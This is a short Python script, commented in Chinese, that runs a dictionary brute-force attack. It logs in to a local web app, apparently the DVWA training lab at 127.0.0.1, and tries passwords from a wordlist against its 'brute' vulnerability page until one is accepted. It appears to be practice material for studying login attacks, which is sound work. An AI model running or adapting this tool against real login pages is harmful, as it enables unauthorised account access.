import http.cookiejar
import urllib.request
import urllib.parse
import re
import sys
#COOKIE容器
cookie = http.cookiejar.CookieJar()
cookieProc = urllib.request.HTTPCookieProcessor(cookie)
opener = urllib.request.build_opener(cookieProc)
urllib.request.install_opener(opener)

#模拟登录
data = urllib.parse.urlencode({'username':'admin','password':'password','Login':'Login'})
data = data.encode('utf-8')
req = urllib.request.Request("http://127.0.0.1:8090/login.php", data)
content = urllib.request.urlopen(req)
text = content.read()
#print(text)
#print(cookie._cookies)

#基本设置
checker=re.compile(r"[\w\W]*incorrect[\w\W]*")
query_string="http://127.0.0.1:8090/vulnerabilities/brute/?username=admin&password=%s&Login=Login#"
dict_name='dict.txt'

#主循环
file = open(dict_name)
for i in file.readlines():
    i = i.strip()
    #print(i)
    try:
        new_req=urllib.request.urlopen(query_string%i)
        new_text=new_req.read()
        #print(new_text)
        #print(text)
        if checker.match(new_text.decode("utf-8"))==None:
            print("Successful")
            print("Password is : %s" % i)
            sys.exit()
        else:
            print("try %s failed" % i)
    except Exception:
        print("Unexpecct error")